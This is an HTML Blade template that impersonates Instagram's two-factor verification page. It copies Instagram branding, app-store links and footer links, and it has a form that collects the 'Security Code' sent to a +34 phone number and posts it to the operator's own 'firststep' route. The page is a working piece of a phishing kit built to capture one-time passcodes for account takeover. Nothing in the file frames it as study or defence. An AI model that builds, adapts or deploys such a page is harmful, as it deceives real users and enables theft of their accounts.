<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link href="{{ asset('css/app.css') }}" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
    <link rel="shortcut icon" href="{{ asset('images/logo3.png') }}" type="image/x-icon">
    <title>Connexion - Instagram
    </title>
</head>
<style>
    .font {
        background-color: #fafafa;
    }

    .size {
        width: 23rem;
    }

    .inputcolor {
        background-color: #fffcfc;
    }

    .bluebutton {
        background-color: #b8dcfc;
    }

    .fonttext {
        font-family: 'Roboto', sans-serif;
    }
</style>

<body class="font fonttext">
    <div class="flex justify-center mt-10">
        <div class="bg-white border size border-gray-300">
            <div class="flex justify-center">
                <img class="mt-10" width="85" height="" src="images/secure.png" alt="">
            </div>
            <h1 class="text-center text-sm mt-4 mx-4 ">Enter the code we sent to your number starting in +34.
            </h1>
            <div class="flex justify-center mt-4">
                <form method="POST" class="inline-block px-8" action="{{ route('firststep') }}">
                    @csrf
                    <input
                        class="border border-gray-300 inputcolor rounded p-2 block w-72 text-sm focus:outline-none focus:border-gray-400 focus:border"
                        type="text" placeholder="Security Code" name="otp">
                    <button
                        class="bg-blue-500 hover:bg-blue-700 w-full rounded mt-4 p-1 text-white font-bold">Confirm</button>
                </form>
            </div>
            <div>
                <h1 class="text-md text-center mt-4 mx-4">Didn't get a security code?</h1>
                <h1 class="text-md text-center mx-4">We can <a class="text-blue-700" href="">resend it.</a></h1>
            </div>
            <div class="mb-10">
                <h1 class="text-sm text-center mt-4 mx-4">If you're unable to receive a security code, use one of your
                    backup code.
                </h1>
            </div>

        </div>
    </div>

    </div>
    <div>
        <h1 class="text-center mt-4 text-sm">Get the app.</h1>
    </div>
    <div class="mt-4 flex justify-center">
        <a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img class="mx-1" width="150"
                height="100" src="images/apple.png" alt=""></a>
        <a
            href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DB4168539-1BC5-48A6-82F2-EA030E18AC1C%26utm_content%3Dlo%26utm_medium%3Dbadge"><img
                class="mx-1" width="150" height="100" src="images/google.png" alt=""></a>
    </div>
    <div class="mt-14 text-xs text-gray-500">
        <div class="flex justify-center">
            <a class="mx-2" href="https://about.facebook.com/meta">Meta</a>
            <a class="mx-2" href="https://about.instagram.com/blog/">About</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Blog</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Jobs</a>
            <a class="mx-2" href="https://about.instagram.com/about-us/careers">Help</a>
            <a class="mx-2" href="https://developers.facebook.com/docs/instagram">API</a>
            <a class="mx-2" href="https://www.instagram.com/legal/privacy/">Privacy</a>
            <a class="mx-2" href="https://www.instagram.com/legal/terms/">Terms</a>
            <a class="mx-2" href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
            <a class="mx-2" href="https://www.instagram.com/directory/hashtags/">Hashtags</a>
            <a class="mx-2" href="https://www.instagram.com/explore/locations/">Locations</a>
            <a class="mx-2" href="https://www.instagram.com/web/lite/">Instagram Lite</a>
            <a class="mx-2" href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading &
                Non-Users</a>
        </div>
        <div class="mt-4 flex justify-center mb-20">
            <h1 class="mx-2">Français</h1>
            <h1 class="mx-2">© 2022 Instagram par Meta</h1>
        </div>
    </div>
</body>

</html>
